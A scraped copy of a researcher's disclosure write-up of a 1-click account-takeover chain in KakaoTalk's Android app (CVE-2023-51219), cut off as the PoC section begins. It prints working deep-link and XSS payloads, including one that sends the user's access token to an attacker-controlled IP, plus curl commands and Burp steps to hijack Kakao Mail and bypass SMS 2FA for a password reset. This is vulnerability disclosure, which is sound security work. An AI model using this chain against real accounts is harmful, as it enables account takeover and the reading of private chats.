<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://stulle123.github.io/posts/kakaotalk-account-takeover/">Original</a>
    <h1>I found a 1-click exploit in South Korea&#39;s biggest mobile chat app</h1>
    
    <div id="readability-page-1" class="page"><div><p>In this blog post we show how multiple low-hanging fruit vulnerabilities in KakaoTalk’s Android app can lead to the disclosure of users’ messages. We will cover different topics ranging from Android AppSec to Web Security.</p><h2 id="tldr">TL;DR</h2><p>First things first: <a href="#poc">PoC||GTFO</a></p><video width="100%" controls="">
<source src="https://github.com/stulle123/kakaotalk_analysis/assets/14765446/7fd439c5-b96b-49d9-b8b5-cd9be2a51fe9" type="video/mp4"/></video><p>A deep link validation issue in KakaoTalk <code>10.4.3</code> allows a remote adversary to run arbitrary JavaScript in a WebView that leaks an access token in a HTTP request header. Ultimately, this token can be used to takeover another user’s account and read her/his chat messages by registering an attacker-controlled device. This bug got assigned with <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-51219">CVE-2023-51219</a>. We also release our <a href="https://github.com/stulle123/kakaotalk_analysis">tooling</a> so that fellow security researchers can dig into KakaoTalk’s broad attack surface to find more bugs.</p><h2 id="context">Context</h2><p>With more than 100 million downloads from the Google Playstore, KakaoTalk is South Korea’s most popular chat app. Similar to apps such as WeChat, KakaoTalk is an “all-in” app including everything into one app (payment, ride-hailing services, shopping, e-mail, etc.). End-to-end encrypted (E2EE) messaging is not enabled per default in KakaoTalk. Regular chatrooms, where Kakao Corp. can access messages in transit, is the preferred way for many users. KakaoTalk does have an opt-in E2EE feature called “Secure Chat” but it doesn’t support features such as group messaging or voice calling.</p><h2 id="entry-point-commercebuyactivity">Entry Point: CommerceBuyActivity</h2><p>The <code>CommerceBuyActivity</code> WebView is the main entry point and very interesting from an attacker’s point of view:</p><ul><li>It’s exported and can be started with a deep link (e.g., <code>adb shell am start kakaotalk://buy</code>)</li><li>It has JavaScript enabled (<code>settings.setJavaScriptEnabled(true);</code>)</li><li>It supports the <code>intent://</code> <a href="https://www.mbsd.jp/Whitepaper/IntentScheme.pdf">scheme</a> to send data to other <strong>non-exported</strong> app components via JavaScript. For example, the URI <code>&#34;intent:#Intent;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity;S.EXTRA_URL=https://foo.bar;end&#34;</code> loads the website <code>https://foo.bar</code> in the <code>MyProfileSettingsActivity</code> WebView.</li><li>There’s no sanitization of <code>intent://</code> URIs (e.g., the <code>Component</code> or <code>Selector</code> is <strong>not</strong> set to <code>null</code>). So, potentially any app component can be accessed.</li></ul><p>Additionally, it leaks an access token in the <code>Authorization</code> HTTP header. Here’s a simple way to reproduce this behavior:</p><ul><li>Start a Netcat listener in a terminal window: <code>$ nc -l 5555</code></li><li>Run <code>$ adb shell am start kakaotalk://buy</code> to start the <code>CommerceBuyActivity</code> WebView</li><li>Since <code>WebView.setWebContentsDebuggingEnabled(true);</code> you can use <code>chrome://inspect</code> in Chrome to debug it</li><li>Go to the <code>Console</code> tab and enter <code>document.location=&#34;http://&lt;your-IP-address&gt;:5555/&#34;;</code></li><li>You should see a GET request and the <code>Authorization</code> header</li></ul><p>This means that if we find a way to run our own JavaScript inside the <code>CommerceBuyActivity</code> we would have the ability to steal the user’s access token and to start arbitrary app components when the user clicks on a malicious <code>kakaotalk://buy</code> deep link.</p><p>Unfortunately, we can’t load arbitrary attacker-controlled URLs as there is some validation going on:</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span><span>16
</span><span>17
</span><span>18
</span><span>19
</span><span>20
</span><span>21
</span><span>22
</span><span>23
</span><span>24
</span><span>25
</span><span>26
</span><span>27
</span><span>28
</span><span>29
</span><span>30
</span><span>31
</span><span>32
</span><span>33
</span><span>34
</span><span>35
</span><span>36
</span><span>37
</span><span>38
</span><span>39
</span><span>40
</span><span>41
</span><span>42
</span></code></pre></td><td><pre tabindex="0"><code data-lang="java"><span><span><span>public</span><span> </span><span>final</span><span> </span><span>String</span><span> </span><span>m17260P5</span><span>(</span><span>Uri</span><span> </span><span>uri</span><span>)</span><span> </span><span>{</span><span>
</span></span></span><span><span><span>    </span><span>// This string is &#34;https://buy.kakao.com&#34;</span><span>
</span></span></span><span><span><span>    </span><span>String</span><span> </span><span>m36725d</span><span> </span><span>=</span><span> </span><span>C24983v</span><span>.</span><span>m36725d</span><span>();</span><span>
</span></span></span><span><span><span>
</span></span></span><span><span><span>    </span><span>if</span><span> </span><span>(</span><span>uri</span><span> </span><span>!=</span><span> </span><span>null</span><span>)</span><span> </span><span>{</span><span>
</span></span></span><span><span><span>        </span><span>if</span><span> </span><span>(</span><span>!</span><span>C46907a</span><span>.</span><span>m54284B</span><span>(</span><span>uri</span><span>.</span><span>toString</span><span>(),</span><span> </span><span>new</span><span> </span><span>ArrayList</span><span>(</span><span>Arrays</span><span>.</span><span>asList</span><span>(</span><span>C47684e</span><span>.</span><span>f174778c0</span><span>,</span><span> </span><span>&#34;buy&#34;</span><span>))))</span><span> </span><span>{</span><span>
</span></span></span><span><span><span>            </span><span>return</span><span> </span><span>null</span><span>;</span><span>
</span></span></span><span><span><span>        </span><span>}</span><span>
</span></span></span><span><span><span>
</span></span></span><span><span><span>        </span><span>if</span><span> </span><span>(</span><span>C43097e</span><span>.</span><span>m51424i</span><span>(</span><span>uri</span><span>.</span><span>getQueryParameter</span><span>(</span><span>&#34;refresh&#34;</span><span>),</span><span> </span><span>RTCStatsParser</span><span>.</span><span>Key</span><span>.</span><span>TRUE</span><span>))</span><span> </span><span>{</span><span>
</span></span></span><span><span><span>            </span><span>this</span><span>.</span><span>f33349x</span><span> </span><span>=</span><span> </span><span>true</span><span>;</span><span>
</span></span></span><span><span><span>        </span><span>}</span><span>
</span></span></span><span><span><span>
</span></span></span><span><span><span>        </span><span>if</span><span> </span><span>((</span><span>&#34;kakaotalk&#34;</span><span>.</span><span>equals</span><span>(</span><span>uri</span><span>.</span><span>getScheme</span><span>())</span><span> </span><span>||</span><span> </span><span>&#34;alphatalk&#34;</span><span>.</span><span>equals</span><span>(</span><span>uri</span><span>.</span><span>getScheme</span><span>()))</span><span> </span><span>&amp;&amp;</span><span> </span><span>&#34;buy&#34;</span><span>.</span><span>equals</span><span>(</span><span>uri</span><span>.</span><span>getHost</span><span>()))</span><span> </span><span>{</span><span>
</span></span></span><span><span><span>            </span><span>// URL path can be controlled by an attacker</span><span>
</span></span></span><span><span><span>            </span><span>if</span><span> </span><span>(</span><span>!</span><span>TextUtils</span><span>.</span><span>isEmpty</span><span>(</span><span>uri</span><span>.</span><span>getPath</span><span>()))</span><span> </span><span>{</span><span>
</span></span></span><span><span><span>                </span><span>m36725d</span><span> </span><span>=</span><span> </span><span>String</span><span>.</span><span>format</span><span>(</span><span>&#34;%s%s&#34;</span><span>,</span><span> </span><span>m36725d</span><span>,</span><span> </span><span>uri</span><span>.</span><span>getPath</span><span>());</span><span>
</span></span></span><span><span><span>            </span><span>}</span><span>
</span></span></span><span><span><span>
</span></span></span><span><span><span>            </span><span>// URL query parameters can be controlled by an attacker</span><span>
</span></span></span><span><span><span>            </span><span>if</span><span> </span><span>(</span><span>!</span><span>TextUtils</span><span>.</span><span>isEmpty</span><span>(</span><span>uri</span><span>.</span><span>getQuery</span><span>()))</span><span> </span><span>{</span><span>
</span></span></span><span><span><span>                </span><span>m36725d</span><span> </span><span>=</span><span> </span><span>String</span><span>.</span><span>format</span><span>(</span><span>&#34;%s?%s&#34;</span><span>,</span><span> </span><span>m36725d</span><span>,</span><span> </span><span>uri</span><span>.</span><span>getQuery</span><span>());</span><span>
</span></span></span><span><span><span>            </span><span>}</span><span>
</span></span></span><span><span><span>
</span></span></span><span><span><span>            </span><span>// URL fragment can be controlled by an attacker</span><span>
</span></span></span><span><span><span>            </span><span>if</span><span> </span><span>(</span><span>!</span><span>TextUtils</span><span>.</span><span>isEmpty</span><span>(</span><span>uri</span><span>.</span><span>getFragment</span><span>()))</span><span> </span><span>{</span><span>
</span></span></span><span><span><span>                </span><span>return</span><span> </span><span>String</span><span>.</span><span>format</span><span>(</span><span>&#34;%s#%s&#34;</span><span>,</span><span> </span><span>m36725d</span><span>,</span><span> </span><span>uri</span><span>.</span><span>getFragment</span><span>());</span><span>
</span></span></span><span><span><span>            </span><span>}</span><span>
</span></span></span><span><span><span>
</span></span></span><span><span><span>            </span><span>return</span><span> </span><span>m36725d</span><span>;</span><span>
</span></span></span><span><span><span>        </span><span>}</span><span> </span><span>else</span><span> </span><span>if</span><span> </span><span>(</span><span>C14325o2</span><span>.</span><span>f55096k</span><span>.</span><span>matcher</span><span>(</span><span>uri</span><span>.</span><span>toString</span><span>()).</span><span>matches</span><span>())</span><span> </span><span>{</span><span>
</span></span></span><span><span><span>            </span><span>String</span><span> </span><span>uri2</span><span> </span><span>=</span><span> </span><span>uri</span><span>.</span><span>toString</span><span>();</span><span>
</span></span></span><span><span><span>
</span></span></span><span><span><span>            </span><span>if</span><span> </span><span>(</span><span>uri2</span><span>.</span><span>startsWith</span><span>(</span><span>&#34;http://&#34;</span><span>))</span><span> </span><span>{</span><span>
</span></span></span><span><span><span>                </span><span>return</span><span> </span><span>uri2</span><span>.</span><span>replace</span><span>(</span><span>&#34;http://&#34;</span><span>,</span><span> </span><span>&#34;https://&#34;</span><span>);</span><span>
</span></span></span><span><span><span>            </span><span>}</span><span>
</span></span></span><span><span><span>
</span></span></span><span><span><span>            </span><span>return</span><span> </span><span>uri2</span><span>;</span><span>
</span></span></span><span><span><span>        </span><span>}</span><span>
</span></span></span><span><span><span>    </span><span>}</span><span>
</span></span></span><span><span><span>    </span><span>return</span><span> </span><span>m36725d</span><span>;</span><span>
</span></span></span><span><span><span></span><span>}</span><span>
</span></span></span></code></pre></td></tr></tbody></table></div></div><p>If you take a look at the code you’ll recognize that we control the path, query parameters and fragment of the URL. However, everything is prefixed with the String <code>m36725d</code> which is <code>https://buy.kakao.com</code> in our case. That means if a user clicks on the deep link <code>kakaotalk://buy/foo</code> the URL <code>https://buy.kakao.com/foo</code> gets loaded in the <code>CommerceBuyActivity</code> WebView.</p><p>Maybe there’s an Open Redirect or XSS issue on <code>https://buy.kakao.com</code> so that we can run JavaScript? 🤔</p><h2 id="url-redirect-to-dom-xss">URL Redirect to DOM XSS</h2><p>While digging into <code>https://buy.kakao.com</code> we identified the endpoint <code>https://buy.kakao.com/auth/0/cleanFrontRedirect?returnUrl=</code> which allowed to redirect to any <code>kakao.com</code> domain. This vastly increased our chances to find a XSS flaw as there are many many subdomains under <code>kakao.com</code>.</p><p>To find a vulnerable website we just googled for <code>site:*.kakao.com inurl:search -site:developers.kakao.com -site:devtalk.kakao.com</code> and found <code>https://m.shoppinghow.kakao.com/m/search/q/yyqw6t29</code>. The string <code>yyqw6t29</code> looked like a <a href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader/settings/canary">DOM Invader canary</a> to us, so we investigated further.</p><p>Funnily enough, there was already a Stored XSS as <code>https://m.shoppinghow.kakao.com/m/search/q/alert(1)</code> popped up an alert box. Searching the DOM brought up the responsible Stored XSS payload <code>[해외]test &#34;&gt;&lt;svg/onload=alert(1);// Pullover Hoodie</code>. <strong>Edit:</strong> As of May 2024 this seems to be fixed.</p><p>Continuing to browse the DOM we discovered another <a href="https://m.shoppinghow.kakao.com/m/product/Y25001977964/q:foo">endpoint</a> where the search query was passed to a <code>innerHTML</code> sink (see <a href="https://github.com/stulle123/kakaotalk_analysis/blob/main/doc/ACCOUNT_TAKEOVER.md#dom-xss">DOM Invader notes</a>). Eventually, the PoC XSS payload turned out to be as simple as <code>&#34;&gt;&lt;img src=x onerror=alert(1);&gt;</code>.</p><p>At this point we could run arbitrary JavaScript in the <code>CommerceBuyActivity</code> WebView when the user clicked on a deep link such as <code>kakaotalk://auth/0/cleanFrontRedirect?returnUrl=https://m.shoppinghow.kakao.com/m/product/Y25001977964/q:&#34;&gt;&lt;img src=x onerror=alert(1);&gt;</code>.</p><p>As explained <a href="#entry-point-commercebuyactivity">above</a>, <code>CommerceBuyActivity</code> leaks the user’s access token in the <code>Authorization</code> header.</p><p>What could we do with this token? Maybe take over a victim’s KakaoTalk account? 😌</p><svg width="0" height="0" display="none" xmlns="http://www.w3.org/2000/svg"><symbol id="tip-box" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M504 256c0 136.967-111.033 248-248 248S8 392.967 8 256 119.033 8 256 8s248 111.033 248 248zM227.314 387.314l184-184c6.248-6.248 6.248-16.379.0-22.627l-22.627-22.627c-6.248-6.249-16.379-6.249-22.628.0L216 308.118l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628.0l-22.627 22.627c-6.248 6.248-6.248 16.379.0 22.627l104 104c6.249 6.249 16.379 6.249 22.628.001z"></path></symbol><symbol id="important-box" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M504 256c0 136.997-111.043 248-248 248S8 392.997 8 256C8 119.083 119.043 8 256 8s248 111.083 248 248zm-248 50c-25.405.0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346 7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373.0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884.0-12.356 5.78-11.981 12.654z"></path></symbol><symbol id="warning-box" viewBox="0 0 576 512" preserveAspectRatio="xMidYMid meet"><path d="M569.517 440.013C587.975 472.007 564.806 512 527.94 512H48.054c-36.937.0-59.999-40.055-41.577-71.987L246.423 23.985c18.467-32.009 64.72-31.951 83.154.0l239.94 416.028zM288 354c-25.405.0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346 7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373.0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884.0-12.356 5.78-11.981 12.654z"></path></symbol><symbol id="info-box" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M256 8C119.043 8 8 119.083 8 256c0 136.997 111.043 248 248 248s248-111.003 248-248C504 119.083 392.957 8 256 8zm0 110c23.196.0 42 18.804 42 42s-18.804 42-42 42-42-18.804-42-42 18.804-42 42-42zm56 254c0 6.627-5.373 12-12 12h-88c-6.627.0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h12v-64h-12c-6.627.0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h64c6.627.0 12 5.373 12 12v1e2h12c6.627.0 12 5.373 12 12v24z"></path></symbol></svg><div><p>Btw, we could also start arbitrary non-exported app components since <code>CommerceBuyActivity</code> supports the <code>intent://</code> scheme.</p></div><h2 id="deep-link-to-kakao-mail-account-takeover">Deep Link to Kakao Mail Account Takeover</h2><p>As explained in the previous section, we can steal the user’s access token by running arbitrary JS in the <code>CommerceBuyActivity</code> WebView. By crafting a malicious deep link, we could send the token to an attacker-controlled server:</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span></code></pre></td><td><pre tabindex="0"><code data-lang="fallback"><span><span>kakaotalk://buy/auth/0/cleanFrontRedirect?returnUrl=https://m.shoppinghow.kakao.com/m/product/Q24620753380/q:&#34;&gt;&lt;img src=x onerror=&#34;document.location=atob(&#39;aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUv&#39;);&#34;&gt;
</span></span></code></pre></td></tr></tbody></table></div></div><p>Let’s break it down:</p><ul><li><code>kakaotalk://buy</code> fires up <code>CommerceBuyActivity</code></li><li><code>/auth/0/cleanFrontRedirect?returnUrl=</code> “compiles” to <code>https://buy.kakao.com/auth/0/cleanFrontRedirect?returnUrl=</code> and redirects to any <code>kakao.com</code> domain</li><li><code>https://m.shoppinghow.kakao.com/m/product/Q24620753380/q:</code> had the XSS issue</li><li><code>&#34;&gt;&lt;img src=x onerror=&#34;document.location=atob(&#39;aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUv&#39;);&#34;&gt;</code> is the XSS payload. We had to Base64 encode <code>http://192.168.178.20:5555/</code> to bypass some sanitization checks.</li></ul><p>Now, in possession of the access token what could we do with it? Well, how about we use it to take over the victim’s Kakao Mail account that was used for KakaoTalk registration!</p><div><p>If the victim doesn’t have a Kakao Mail account it’s possible to create a new Kakao Mail account on her/his behalf. This is interesting because creating a new Kakao Mail account overwrites the user’s previous registered email-address with no additional checks. Scroll to the end of this section to check out how to do that.</p></div><p>First, we needed to check if the victim actually uses Kakao Mail:</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td><td><pre tabindex="0"><code data-lang="bash"><span><span>curl -i -s -k -X <span>$&#39;GET&#39;</span> <span>\
</span></span></span><span><span><span></span>    -H <span>$&#39;Host: katalk.kakao.com&#39;</span> -H <span>$&#39;Accept-Language: en&#39;</span> -H <span>$&#39;User-Agent: KT/10.4.3 An/11 en&#39;</span> -H <span>$&#39;Authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e&#39;</span> -H <span>$&#39;A: android/9.5.0/en&#39;</span> -H <span>$&#39;C: a327a1ad-b417-499a-abf7-48da89076e7c&#39;</span> -H <span>$&#39;Accept-Encoding: json, deflate, br&#39;</span> -H <span>$&#39;Connection: close&#39;</span> <span>\
</span></span></span><span><span><span></span>    <span>$&#39;https://katalk.kakao.com/android/account/more_settings.json?os_version=30&amp;model=SDK_GPHONE_ARM64&amp;since=1693786891&amp;lang=en&amp;vc=2610380&amp;email=2&amp;adid=&amp;adid_status=-1&#39;</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>Next, we had to grab another access token to access Kakao Mail:</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span></code></pre></td><td><pre tabindex="0"><code data-lang="bash"><span><span>curl -i -s -k -X <span>$&#39;POST&#39;</span> <span>\
</span></span></span><span><span><span></span>    -H <span>$&#39;Host: api-account.kakao.com&#39;</span> -H <span>$&#39;Accept-Language: en&#39;</span> -H <span>$&#39;User-Agent: KT/10.4.3 An/11 en&#39;</span> -H <span>$&#39;Authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e&#39;</span> -H <span>$&#39;A: android/10.4.3/en&#39;</span> -H <span>$&#39;C: 2cc348d0-b7f7-464c-b72b-1e3f66a04362&#39;</span> -H <span>$&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -H <span>$&#39;Content-Length: 174&#39;</span> -H <span>$&#39;Accept-Encoding: json, deflate, br&#39;</span> -H <span>$&#39;Connection: close&#39;</span> <span>\
</span></span></span><span><span><span></span>    --data-binary <span>$&#39;key_type=talk_session_info&amp;key=64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e&amp;referer=talk&#39;</span> <span>\
</span></span></span><span><span><span></span>    <span>$&#39;https://api-account.kakao.com/v1/auth/tgt&#39;</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>This was an example response:</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span></code></pre></td><td><pre tabindex="0"><code data-lang="json"><span><span><span>{</span><span>&#34;code&#34;</span><span>:</span><span>0</span><span>,</span><span>&#34;token&#34;</span><span>:</span><span>&#34;5e09081b0cce35288422a0b6589ef860&#34;</span><span>,</span><span>&#34;expires&#34;</span><span>:</span><span>1700735745</span><span>,</span><span>&#34;verifyToken&#34;</span><span>:</span><span>null</span><span>}</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>With the newly gathered token we could access a victim’s Kakao Mail account with Burp. Here’s a way for you to reproduce it:</p><ol><li>Launch Burp’s browser: go to the <code>Proxy &gt; Intercept</code> tab, click <code>Open browser</code> and clear the browser’s cache.</li><li>Go to the <code>Repeater</code> tab and create a new <code>HTTP</code> request (click on the <code>+</code> button).</li><li>Paste in the following (adapt the <code>Ka-Tgt</code> header accordingly):</li></ol><div><div><table><tbody><tr><td><pre tabindex="0"><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span><span>16
</span><span>17
</span></code></pre></td><td><pre tabindex="0"><code data-lang="fallback"><span><span>GET / HTTP/2
</span></span><span><span>Host: talk.mail.kakao.com
</span></span><span><span>Pragma: no-cache
</span></span><span><span>Cache-Control: no-cache
</span></span><span><span>Upgrade-Insecure-Requests: 1
</span></span><span><span>User-Agent: Mozilla/5.0 (Linux; Android 11; sdk_gphone_arm64 Build/RSR1.210722.013.A6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36;KAKAOTALK 2610380
</span></span><span><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
</span></span><span><span>Km-Viewer-Ver: 1
</span></span><span><span>Kakaotalk-Agent: os=android;osver=30;appver=10.4.3;lang=en;dtype=1;idiom=phone;device=SDK_GPHONE_ARM64
</span></span><span><span>Ka-Tgt: 5e09081b0cce35288422a0b6589ef860
</span></span><span><span>X-Requested-With: com.kakao.talk
</span></span><span><span>Sec-Fetch-Site: none
</span></span><span><span>Sec-Fetch-Mode: navigate
</span></span><span><span>Sec-Fetch-User: ?1
</span></span><span><span>Sec-Fetch-Dest: document
</span></span><span><span>Accept-Encoding: gzip, deflate, br
</span></span><span><span>Accept-Language: en-US,en;q=0.9
</span></span></code></pre></td></tr></tbody></table></div></div><ol start="4"><li>Click on <code>Send</code> and confirm the target’s details</li><li>Right-click in the request window, select <code>Request in browser &gt; In original session</code> and copy the URL into Burp’s browser.</li></ol><p>If necessary, we could also create a new Kakao Mail account on the user’s behalf. Just repeat the same steps with Burp using the following HTTP request (adapt the <code>Authorization</code> header):</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span><span>16
</span><span>17
</span></code></pre></td><td><pre tabindex="0"><code data-lang="fallback"><span><span>GET /kakao_mail/main?continue=https://talk.mail.kakao.com HTTP/1.1
</span></span><span><span>Host: auth.kakao.com
</span></span><span><span>Pragma: no-cache
</span></span><span><span>Cache-Control: no-cache
</span></span><span><span>Upgrade-Insecure-Requests: 1
</span></span><span><span>User-Agent: Mozilla/5.0 (Linux; Android 11; sdk_gphone_arm64 Build/RSR1.210722.013.A6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36;KAKAOTALK 2610430
</span></span><span><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
</span></span><span><span>Authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e
</span></span><span><span>Http_a: android/10.4.3/en
</span></span><span><span>X-Requested-With: com.kakao.talk
</span></span><span><span>Sec-Fetch-Site: none
</span></span><span><span>Sec-Fetch-Mode: navigate
</span></span><span><span>Sec-Fetch-User: ?1
</span></span><span><span>Sec-Fetch-Dest: document
</span></span><span><span>Accept-Encoding: gzip, deflate, br
</span></span><span><span>Accept-Language: en-US,en;q=0.9
</span></span><span><span>Connection: close
</span></span></code></pre></td></tr></tbody></table></div></div><p>When creating a new email address tick the box <code>Set As Primary Email</code>.</p><h2 id="kakaotalk-password-reset-with-burp">KakaoTalk Password Reset with Burp</h2><p>With access to the victim’s Kakao Mail account, a password reset was the next logical step. The only additional information required were the victim’s email address, nickname and phone number which we got with the same curl query that we used above:</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td><td><pre tabindex="0"><code data-lang="bash"><span><span>curl -i -s -k -X <span>$&#39;GET&#39;</span> <span>\
</span></span></span><span><span><span></span>    -H <span>$&#39;Host: katalk.kakao.com&#39;</span> -H <span>$&#39;Accept-Language: en&#39;</span> -H <span>$&#39;User-Agent: KT/10.4.3 An/11 en&#39;</span> -H <span>$&#39;Authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e&#39;</span> -H <span>$&#39;A: android/9.5.0/en&#39;</span> -H <span>$&#39;C: a327a1ad-b417-499a-abf7-48da89076e7c&#39;</span> -H <span>$&#39;Accept-Encoding: json, deflate, br&#39;</span> -H <span>$&#39;Connection: close&#39;</span> <span>\
</span></span></span><span><span><span></span>    <span>$&#39;https://katalk.kakao.com/android/account/more_settings.json?os_version=30&amp;model=SDK_GPHONE_ARM64&amp;since=1693786891&amp;lang=en&amp;vc=2610380&amp;email=2&amp;adid=&amp;adid_status=-1&#39;</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>Changing the password via <code>https://accounts.kakao.com</code> turned out to be a bit complicated as we had to bypass 2FA via SMS. However, it was as simple as intercepting and modifying a couple of requests with Burp. This is how you can do it:</p><ol><li>Using the Burp browser visit the <a href="https://accounts.kakao.com/weblogin/find_password?lang=en&amp;continue=%2Flogin%3Fcontinue%3Dhttps%253A%252F%252Faccounts.kakao.com%252Fweblogin%252Faccount%252Finfo">Reset Password</a> link.</li><li>Add the victim’s email address on the next page (<code>Reset password for your Kakao Account</code>). Before clicking on <code>Next</code>, enable the <code>Intercept</code> feature in Burp.</li><li>In Burp, forward all requests until you see a POST request to <code>/kakao_accounts/check_verify_type_for_find_password.json</code>. Right-click and select <code>Do intercept &gt; Response to this request</code>.</li><li>In the response change <code>verify_types</code> to <code>0</code> (this sends the verification code to the victim’s email address and not to her/his phone):</li></ol><div><div><table><tbody><tr><td><pre tabindex="0"><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span></code></pre></td><td><pre tabindex="0"><code data-lang="json"><span><span><span>{</span>
</span></span><span><span>  <span>&#34;status&#34;</span><span>:</span> <span>0</span><span>,</span>
</span></span><span><span>  <span>&#34;verify_types&#34;</span><span>:</span> <span>[</span>
</span></span><span><span>    <span>0</span>
</span></span><span><span>  <span>],</span>
</span></span><span><span>  <span>&#34;suspended&#34;</span><span>:</span> <span>false</span><span>,</span>
</span></span><span><span>  <span>&#34;dormant&#34;</span><span>:</span> <span>false</span><span>,</span>
</span></span><span><span>  <span>&#34;kakaotalk&#34;</span><span>:</span> <span>false</span><span>,</span>
</span></span><span><span>  <span>&#34;expired&#34;</span><span>:</span> <span>false</span><span>,</span>
</span></span><span><span>  <span>&#34;created_at&#34;</span><span>:</span> <span>1700754321</span><span>,</span>
</span></span><span><span>  <span>&#34;two_step_verification&#34;</span><span>:</span> <span>false</span><span>,</span>
</span></span><span><span>  <span>&#34;is_fill_in_email&#34;</span><span>:</span> <span>false</span><span>,</span>
</span></span><span><span>  <span>&#34;account_type&#34;</span><span>:</span> <span>0</span><span>,</span>
</span></span><span><span>  <span>&#34;display_id&#34;</span><span>:</span> <span>null</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></td></tr></tbody></table></div></div><ol start="5"><li>Disable <code>Intercept</code> in Burp and go back to Burp’s browser. Click on <code>Using email address</code>.</li><li>Enter the victim’s nickname and email address on the next page and click the <code>Verify</code> button.</li><li>Open a new browser tab and paste the Burp Repeater URL to access the user’s Kakao Mail account (as described in the <a href="#deep-link-to-kakao-mail-account-takeover">previous</a> section). If the message <code>session expired</code> shows up, clear the browser’s cache.</li><li>Grab the verification code from the email and enter it to proceed to the next page.</li><li>On the page <code>Additional user verification will proceed to protect your Kakao Account.</code>, enable <code>Intercept</code> in Burp again. Enter some values and click <code>Confirm</code>. Back in Burp when you see a POST request to <code>/kakao_accounts/check_phone_number.json</code>, adjust the <code>iso_code</code> and <code>phone_number</code> (without country code) parameters in the request body. Forward the request and disable the <code>Intercept</code> option again.</li><li>Finally, you can enter the new password.</li></ol><h2 id="poc">PoC</h2><p>The goal of the PoC is to register <a href="https://www.kakaocorp.com/page/service/service/KakaoTalk?lang=en">KakaoTalk for Windows/MacOS</a> or the open-source client <a href="https://github.com/KiwiTalk/KiwiTalk">KiwiTalk</a> to a victim’s account to read her/his <strong>non-end-to-end</strong> encrypted chat messages.</p><p>The steps for an attacker are as follows:</p><h3 id="attacker-prepares-the-malicious-deep-link">Attacker prepares the malicious deep link</h3><p>First, she/he stores the payload to a file, …</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
